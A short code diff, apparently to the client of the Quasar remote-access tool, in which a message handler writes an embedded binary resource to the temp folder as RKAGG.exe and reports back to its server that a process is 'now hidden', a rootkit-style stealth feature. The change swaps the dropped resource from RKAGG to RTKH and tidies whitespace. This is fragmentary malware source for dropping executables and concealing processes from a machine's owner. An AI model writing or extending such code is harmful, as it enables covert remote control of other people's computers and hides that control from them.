@@ -48,7 +48,7 @@ namespace Quasar.Client.Messages
                     string text11 = Path.Combine(Path.GetTempPath(), "RKAGG.exe");
                     try
                     {
-                        byte[] agg_Binary = Resource1.RKAGG;
+                        byte[] agg_Binary = Resource1.RTKH;
                         File.WriteAllBytes(text11, agg_Binary);
                     }
                     catch (Exception)
@@ -63,7 +63,7 @@ namespace Quasar.Client.Messages
                         }
                         else
                         {
-                            client.Send(new NotifyMessageToServer    { Message = "RK: Info: process is now hidden (method 2)" });
+                            client.Send(new NotifyMessageToServer { Message = "RK: Info: process is now hidden (method 2)" });
                         }
                     }
                     catch (Exception ex17)
